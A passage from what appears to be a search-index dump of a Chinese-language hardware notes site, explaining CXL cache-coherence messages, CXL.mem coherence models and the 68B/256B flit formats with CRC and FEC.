SnpCur\uff0c\u200b\u83b7\u53d6\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u3002Device \u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u3002\u200b\u53ef\u80fd\u200b\u7684\u200b\u8fd4\u56de\u200b\u6709\u200b RspIHitI\uff0cRspVHitV\uff0cRspSHitSE\uff0cRspSFwdM\uff0cRspIFwdM \u200b\u548c\u200b RspVFwdV\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b V \u200b\u8868\u793a\u200b Valid\uff0c\u200b\u5bf9\u5e94\u200b MESI \u200b\u4e2d\u200b\u7684\u200b MES \u200b\u4e09\u79cd\u200b\u72b6\u6001\u200b\u3002\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u662f\u200b RspIHitI\uff0cRspVHitV \u200b\u548c\u200b RspVFwdV \u200b\u4e09\u79cd\u200b\u54cd\u5e94\u200b\u3002</p> <p>\u200b\u518d\u200b\u8003\u8651\u200b Device \u200b\u4f1a\u200b\u53d1\u9001\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002\u200b\u9996\u5148\u200b\uff0c\u200b\u8bf7\u6c42\u200b\u53ef\u4ee5\u200b\u5206\u4e3a\u200b\u56db\u7c7b\u200b\uff1a</p> <ol> <li>Read\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response \u200b\u548c\u200b H2D Data</li> <li>Read0\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response</li> <li>Write\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response\uff0c\u200b\u53d1\u9001\u200b D2H Data\uff0c\u200b\u53ef\u200b\u9009\u200b\u63a5\u6536\u200b H2D Response</li> <li> <p>Read0-Write\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response\uff0c\u200b\u53d1\u9001\u200b D2H Data</p> </li> <li> <p>RdCurr(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u4e0d\u200b\u9020\u6210\u200b\u4efb\u4f55\u200b\u7684\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u7684\u200b\u4fee\u6539\u200b\u3002Device \u200b\u7f13\u5b58\u200b\u8fd8\u662f\u200b\u5904\u4e8e\u200b Invalid \u200b\u72b6\u6001\u200b\u3002</p> </li> <li>RdOwn(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b E \u200b\u6001\u200b\u6216\u8005\u200b M \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I/GO-E/GO-M\u3002</li> <li>RdShared(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u8fdb\u5165\u200b S \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I/GO-S\u3002</li> <li>RdAny(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u8fdb\u5165\u200b M \u200b\u6001\u200b\uff0cE \u200b\u6001\u200b\u6216\u200b S \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I/GO-S/GO-E/GO-M\u3002</li> <li>RdOwnNoData(Read0)\uff0cDevice \u200b\u4e0d\u200b\u8bfb\u53d6\u200b\u73b0\u5728\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b E \u200b\u6001\u200b\u3002\u200b\u4e00\u822c\u200b\u7528\u4e8e\u200b\u6574\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u90fd\u200b\u8981\u200b\u66f4\u65b0\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0d\u200b\u9700\u8981\u200b\u6216\u8bb8\u200b\u5f53\u524d\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u3002</li> <li>ItoMWr(Read0-Write)\uff0cDevice \u200b\u5199\u5165\u200b\u65b0\u200b\u7684\u200b\u5b8c\u6574\u200b\u7f13\u5b58\u200b\u884c\u5230\u200b Host \u200b\u4e2d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fdb\u5165\u200b M \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_ERR_WritePull\u3002</li> <li>WrCur(Read0-Write)\uff0c\u200b\u548c\u200b ItoMWr \u200b\u57fa\u672c\u200b\u4e00\u6837\u200b\uff0c\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff0c\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u200b\u547d\u4e2d\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u5199\u5165\u200b\u5230\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff1b\u200b\u5982\u679c\u200b\u7f3a\u5931\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u5199\u5165\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_ERR_WritePull\u3002</li> <li>CLFlush(Read0)\uff0c\u200b\u8981\u6c42\u200b Host Invalidate \u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I\u3002</li> <li>CleanEvict(Write)\uff0cDevice \u200b\u8981\u200b Evict \u200b\u4e00\u4e2a\u200b Exclusive \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_WritePull_Drop\u3002</li> <li>DirtyEvict(Write)\uff0cDevice \u200b\u8981\u200b Evict \u200b\u4e00\u4e2a\u200b Modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_ERR_WritePull\u3002</li> <li>CleanEvictNoData(Write)\uff0cDevice \u200b\u8981\u200b Evict \u200b\u4e00\u4e2a\u200b Exclusive \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u53ea\u200b\u7528\u4e8e\u200b\u66f4\u65b0\u200b Snoop Filter\u3002Host \u200b\u54cd\u5e94\u200b GO-I\u3002</li> <li>WrInv(Write)\uff0cWrite Invalidate Line\uff0c\u200b\u5411\u200b Host \u200b\u5199\u5165\u200b 0-64 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b Invalidate \u200b\u7f13\u5b58\u200b\u3002Host \u200b\u54cd\u5e94\u200b WritePull/GO-Err/GO-I\u3002</li> <li>WOWrInv(Write)\uff0cWeakly Ordered \u200b\u7248\u672c\u200b\u7684\u200b WrInV\uff0c\u200b\u5199\u5165\u200b 0-63 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002Host \u200b\u54cd\u5e94\u200b ExtCmp/FastGO_WritePull/GO_ERR_WritePull\u3002</li> <li>WOWrInvF(Write)\uff0cWeakly Ordered \u200b\u7248\u672c\u200b\u7684\u200b WrInv\uff0c\u200b\u5199\u5165\u200b 64 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002Host \u200b\u54cd\u5e94\u200b ExtCmp/FastGO_WritePull/GO_ERR_WritePull\u3002</li> <li>CacheFlushed(Read0)\uff0c\u200b\u544a\u8bc9\u200b Host \u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\u90fd\u200b\u88ab\u200b\u6e05\u7a7a\u200b\u4e86\u200b\uff0c\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\u884c\u90fd\u200b\u5728\u200b I \u200b\u72b6\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-I\u3002</li> </ol>"},{"location":"hardware/cxl.html#_2","title":"\u548c\u200b\u5176\u4ed6\u200b\u534f\u8bae\u200b\u7684\u200b\u5bf9\u6bd4","text":"<p>\u200b\u5728\u200b \u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b \u200b\u4e2d\u200b\u5206\u6790\u200b\u8fc7\u200b TileLink \u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\uff08Master A\uff09\u200b\u51fa\u73b0\u200b\u4e86\u200b\u7f3a\u5931\u200b\uff0c\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u5982\u4e0b\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff1a</p> <ul> <li>Master A -&gt; Slave: Acquire</li> <li>Slave -&gt; Master B: Probe</li> <li>Master B -&gt; Slave: ProbeAck</li> <li>Slave -&gt; Master A: Grant</li> <li>Master A -&gt; Slave: GrantAck</li> </ul> <p>\u200b\u5728\u200b TileLink Cached \u200b\u91cc\u9762\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b Master \u200b\u90fd\u200b\u662f\u200b\u5e73\u7b49\u200b\u7684\u200b\u3002\u200b\u800c\u200b\u5728\u200b CXL \u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u7ef4\u62a4\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u7684\u200b\uff0c\u200b\u6709\u200b CPU \u200b\u5185\u90e8\u200b\u7684\u200b\u5404\u4e2a\u200b\u7f13\u5b58\u200b\u4e4b\u95f4\u200b\uff0c\u200b\u8fd8\u6709\u200b CPU \u200b\u548c\u200b\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u3002\u200b\u800c\u200b CXL.cache \u200b\u4e3b\u8981\u200b\u8d1f\u8d23\u200b\u7684\u200b\u662f\u200b\u4e0e\u200b\u8bbe\u5907\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u90e8\u5206\u200b\uff0c\u200b\u7ef4\u62a4\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b\u5728\u200b CPU \u200b\u4e00\u4fa7\u200b\uff0cHost \u200b\u76f8\u5f53\u4e8e\u200b TileLink \u200b\u7684\u200b Slave\uff0cDevice \u200b\u76f8\u5f53\u4e8e\u200b TileLink \u200b\u7684\u200b Master A\u3002\u200b\u53ef\u4ee5\u200b\u8bf4\u200b CXL.cache \u200b\u662f\u200b\u4e0d\u200b\u5bf9\u79f0\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b CXL \u200b\u4e2d\u200b\u8bbe\u5907\u200b\u8bfb\u53d6\u200b\u7f13\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u7f3a\u5931\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u5982\u4e0b\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff1a</p> <ul> <li>Device -&gt; Host: RdShared/RdOwn</li> <li>Host -&gt; CPU Caches: Custom Snoop Messages</li> <li>Host -&gt; Other CXL Device: SnpData</li> <li>Other CXL Device -&gt; Host: RspSHitSE/RspSFwdM</li> <li>Host -&gt; Device: GO-S</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6574\u4f53\u200b\u7684\u200b\u6d41\u7a0b\u200b\u4e5f\u200b\u662f\u200b\u5dee\u4e0d\u591a\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/cxl.html#cxlmem","title":"CXL.mem","text":"<p>CXL.mem \u200b\u7528\u4e8e\u200b\u6269\u5c55\u200b\u5185\u5b58\u200b\uff0c\u200b\u6839\u636e\u200b\u7c7b\u578b\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c\u200b\u5b83\u200b\u53ef\u80fd\u200b\u5355\u72ec\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u548c\u200b CXL.cache \u200b\u914d\u5408\u200b\u4f7f\u7528\u200b\u3002\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c\u200b\u6709\u200b\u4e09\u79cd\u200b\u4e00\u81f4\u6027\u200b\u6a21\u578b\u200b\uff1a</p> <ol> <li>HDM-H(Host-only Coherent)\uff1a\u200b\u4ec5\u200b Type 3 \u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u65e0\u200b CXL.cache</li> <li>HDM-D(Device Coherent)\uff1a\u200b\u4ec5\u200b Legacy Type 2 \u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6709\u200b CXL.cache</li> <li>HDM-DB(Device Coherent using Back-Invalidation)\uff1aType 2 \u200b\u6216\u200b Type 3 \u200b\u8bbe\u5907\u200b</li> </ol> <p>\u200b\u5728\u200b CXL.cache \u200b\u4e2d\u200b\uff0c\u200b\u4e24\u7aef\u200b\u662f\u200b Host \u200b\u548c\u200b Device\uff1b\u200b\u800c\u200b CXL.mem\uff0c\u200b\u4e24\u7aef\u200b\u662f\u200b Master \u200b\u548c\u200b Subordinate\u3002</p> <p>\u200b\u4ece\u200b Master \u200b\u5230\u200b Subordinate \u200b\u7684\u200b\u6d88\u606f\u200b\uff08M2S\uff09\u200b\u6709\u200b\u4e09\u7c7b\u200b\uff1a</p> <ol> <li>Request(Req)</li> <li>Request with Data(RwD)</li> <li>Back-Invalidation Response(BIRsp)</li> </ol> <p>\u200b\u4ece\u200b Subordinate \u200b\u5230\u200b Master \u200b\u7684\u200b\u6d88\u606f\u200b\uff08S2M\uff09\u200b\u6709\u200b\u4e09\u7c7b\u200b\uff1a</p> <ol> <li>Response without data(NDR, No Data Response)</li> <li>Response with Data(DRS, Data Response)</li> <li>Back-Invalidation Snoop(BiSnp)</li> </ol> <p>\u200b\u5176\u4e2d\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\u7684\u200b\u662f\u200b Back-Invalidation\uff0c\u200b\u8fd9\u4e2a\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b Device \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b Snoop \u200b\u4fee\u6539\u200b Host \u200b\u4e2d\u200b\u7f13\u5b58\u200b\u4e86\u200b Device \u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b Type 3 \u200b\u7684\u200b\u8bbe\u5907\u200b\uff08\u200b\u65e0\u200b CXL.cache\uff09\u200b\u6765\u8bf4\u200b\uff0cDevice \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u6269\u5c55\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u652f\u6301\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\u3002Host \u200b\u53d1\u9001\u200b <code>MemRd*</code>\uff0cDevice \u200b\u54cd\u5e94\u200b MemData\uff1bHost \u200b\u53d1\u9001\u200b <code>MemWr*</code>\uff0cDevice \u200b\u54cd\u5e94\u200b Cmp\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b Type 2 \u200b\u7684\u200b\u8bbe\u5907\u200b\uff08\u200b\u6709\u200b CXL.cache\uff09\u200b\u6765\u8bf4\u200b\uff0cDevice \u200b\u65e2\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u53c8\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u6bd4\u8f83\u590d\u6742\u200b\u4e86\u200b\u3002\u200b\u4f8b\u5982\u200b Host \u200b\u5728\u200b\u8bfb\u53d6\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff08MemRd\uff0cSnpData/SnpInv/SnpCur\uff09\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u5bf9\u200b Device Cache \u200b\u8fdb\u884c\u200b Snoop\uff08SnpData/SnpInv/SnpCur\uff09\uff0c\u200b\u4fdd\u8bc1\u200b\u7f13\u5b58\u200b\u7684\u200b\u4e00\u81f4\u6027\u200b\u3002Host \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u5230\u200b Device Memory \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u6b64\u65f6\u200b Device Cache \u200b\u4e2d\u6709\u200b Dirty \u200b\u6570\u636e\u200b\uff0c\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u5199\u200b\u5408\u5e76\u200b\uff0c\u200b\u518d\u200b\u628a\u200b\u5408\u5e76\u200b\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5230\u200b Device Memory\u3002\u200b\u5f53\u200b Device \u200b\u60f3\u8981\u200b\u4ece\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u53c8\u200b\u7f3a\u5931\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u5224\u65ad\u200b\u6570\u636e\u200b\u5728\u200b Host \u200b\u7aef\u7684\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u8fd8\u662f\u200b\u5728\u200b Device Memory \u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u504f\u7f6e\u200b\uff08Bias\uff09\u200b\u6a21\u5f0f\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u6570\u636e\u200b\u5e94\u8be5\u200b\u653e\u5728\u200b Host \u200b\u8fd8\u662f\u200b Device \u200b\u7684\u200b\u7f13\u5b58\u200b\u4e0a\u200b\u3002Device \u200b\u8981\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b Host \u200b\u4e2d\u200b\u7f13\u5b58\u200b\u4e86\u200b\u8be5\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b Back-Invalidation\u3002\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b\u8fd9\u4e9b\u200b\u573a\u666f\u200b\uff0cCXL.cache \u200b\u548c\u200b CXL.mem \u200b\u4f1a\u200b\u6bd4\u8f83\u590d\u6742\u200b\u3002</p>"},{"location":"hardware/cxl.html#cxl_2","title":"CXL \u200b\u94fe\u8def\u5c42","text":"<p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0cCXL.io \u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b PCIe\uff0c\u200b\u6240\u4ee5\u200b CXL.io \u200b\u7684\u200b\u94fe\u8def\u5c42\u200b\u91c7\u7528\u200b\u7684\u200b\u5c31\u662f\u200b PCIe \u200b\u7684\u200b\u94fe\u8def\u5c42\u200b\u3002</p> <p>\u200b\u800c\u200b\u5bf9\u4e8e\u200b CXL.cache \u200b\u548c\u200b CXL.mem\uff0cCXL \u200b\u5b9a\u4e49\u200b\u4e86\u200b 68B Flit \u200b\u6a21\u5f0f\u200b\u548c\u200b 256B Flit \u200b\u6a21\u5f0f\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b 68B Flit \u200b\u62c6\u200b\u5206\u6210\u200b\u56db\u4e2a\u200b Slot\uff0c\u200b\u6bcf\u4e2a\u200b Slot 16 \u200b\u5b57\u8282\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4fdd\u5b58\u200b\u4e0d\u540c\u200b\u7ec4\u5408\u200b\u7684\u200b CXL \u200b\u8bf7\u6c42\u200b/\u200b\u54cd\u5e94\u200b\uff0c\u200b\u5176\u4e2d\u200b\u7b2c\u4e00\u4e2a\u200b Slot\uff08Slot 0\uff09\u200b\u5f00\u5934\u200b\u8fd8\u6709\u200b Flit Header\u3002\u200b\u6700\u540e\u200b\u8fd8\u6709\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u6ca1\u6709\u200b FEC\u3002\u200b\u4e5f\u200b\u662f\u56e0\u4e3a\u200b 68B Flit \u200b\u6ca1\u6709\u200b FEC\uff0c\u200b\u6240\u4ee5\u200b\u53ea\u200b\u7528\u4e8e\u200b\u4e0d\u200b\u9ad8\u4e8e\u200b 32GT/s \u200b\u7684\u200b\u94fe\u8def\u200b\uff0c\u200b\u66f4\u200b\u9ad8\u200b\u5c31\u200b\u9700\u8981\u200b\u7528\u200b\u5305\u62ec\u200b FEC \u200b\u7684\u200b 256B Flit \u200b\u6a21\u5f0f\u200b\u3002</p> <p>256B Flit \u200b\u6a21\u5f0f\u200b\u6709\u200b\u4e24\u79cd\u200b\uff1a</p> <ol> <li>Standard 256B Flit \u200b\u5305\u62ec\u200b\u5f00\u5934\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u7136\u540e\u200b\u662f\u200b 15 \u200b\u4e2a\u200b Slot\uff0c\u200b\u6700\u540e\u200b\u662f\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b Credit Return\uff0c8 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC\u3002</li> <li>Latency Optimized 256B Flit \u200b\u5305\u62ec\u200b\u5f00\u5934\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u7136\u540e\u200b\u662f\u200b 8 \u200b\u4e2a\u200b Slot\uff08\u200b\u5171\u200b 120 \u200b\u5b57\u8282\u200b\uff09\uff0c\u200b\u7d27\u63a5\u7740\u200b\u662f\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u63a5\u7740\u200b\u662f\u200b\u5269\u4e0b\u200b\u7684\u200b 7 \u200b\u4e2a\u200b Slot\uff0c2B \u200b\u7684\u200b Credit Return\uff0cSlot 8 \u200b\u7684\u200b\u6700\u540e\u200b 2 \u200b\u5b57\u8282\u200b\uff0c6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC \u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\u3002</li> </ol> <p>\u200b\u4e24\u79cd\u200b\u7684\u200b\u683c\u5f0f\u200b\u7684\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff0cLatency Optimized 256B Flit \u200b\u628a\u200b CRC \u200b\u62c6\u6563\u200b\u6210\u200b\u4e86\u200b\u4e24\u200b\u90e8\u5206\u200b\uff0c\u200b\u653e\u5728\u200b\u4e2d\u95f4\u200b\u548c\u200b\u7ed3\u5c3e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u82b1\u8d39\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff086+6B\uff09\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u6bcf\u200b\u6536\u5230\u200b 128B \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u505a\u200b CRC \u200b\u68c0\u67e5\u200b\uff0c\u200b\u4e0d\u7528\u200b\u7b49\u5230\u200b\u6536\u5230\u200b\u5b8c\u6574\u200b\u7684\u200b 256B\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u8fd9\u200b\u4e24\u79cd\u200b CXL 256B Flit \u200b\u548c\u200b PCIe 256B Flit \u200b\u7684\u200b\u5bf9\u6bd4\u200b\u793a\u610f\u56fe\u200b\uff1a</p> <p> </p> CXL \u200b\u548c\u200b PCIe FLIT \u200b\u683c\u5f0f\u200b\u5bf9\u6bd4\u200b\uff08\u200b\u56fe\u6e90\u200b CXL 3.0 Scales the Future Data Center\uff09 <p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c256B Flit \u200b\u88ab\u200b\u5206\u4e3a\u200b\u4e86\u200b\u524d\u534a\u90e8\u200b\u5206\u200b\uff08Even Flit\uff09\u200b\u548c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\uff08Odd Flit\uff09\u3002\u200b\u524d\u534a\u90e8\u200b\u5206\u200b\uff08Even Flit\uff09\u200b\u5305\u62ec\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c120 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u8fd9\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u4fdd\u62a4\u200b\u7684\u200b\u5c31\u662f\u200b Even Flit \u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\uff08Odd Flit\uff09\u200b\u5305\u62ec\u200b 116 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC \u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u5176\u4e2d\u200b FEC \u200b\u4fdd\u62a4\u200b\u7684\u200b\u662f\u200b\u5b8c\u6574\u200b\u7684\u200b 256B \u200b\u6570\u636e\u200b\uff0cCRC \u200b\u4fdd\u62a4\u200b\u7684\u200b\u662f\u200b\u540e\u200b 128 \u200b\u5b57\u8282\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u63a5\u53d7\u65b9\u200b\u6536\u5230\u200b\u524d\u200b 128 \u200b\u5b57\u8282\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b CRC \u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u6536\u5230\u200b\u540e\u200b 128 \u200b\u81ea\u5df1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b CRC \u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u9a8c\u8bc1\u200b FEC\u3002\u200b\u5982\u679c\u200b\u4efb\u4f55\u200b\u4e00\u90e8\u5206\u200b\u7684\u200b CRC \u200b\u6821\u9a8c\u200b\u5931\u8d25\u200b\uff0c\u200b\u518d\u7528\u200b FEC \u200b\u6765\u200b\u7ea0\u6b63\u200b\u6574\u4e2a\u200b 256B Flit\u3002\u200b\u5982\u679c\u200b FEC \u200b\u8fd8\u662f\u200b\u7ea0\u6b63\u200b\u5931\u8d25\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u91cd\u4f20\u200b\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u5728\u200b\u51cf\u5c11\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u590d\u6742\u6027\u200b\uff1a\u200b\u4f8b\u5982\u200b\u524d\u534a\u90e8\u200b\u5206\u200b CRC \u200b\u9a8c\u8bc1\u200b\u6b63\u786e\u200b\uff0c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b CRC \u200b\u9a8c\u8bc1\u200b\u9519\u8bef\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u7528\u200b FEC \u200b\u8fdb\u884c\u200b\u7ea0\u9519\u200b\uff0c\u200b\u7ea0\u9519\u200b\u4e4b\u540e\u200b\u53d1\u73b0\u200b\uff0c\u200b\u524d\u534a\u90e8\u200b\u5206\u200b CRC 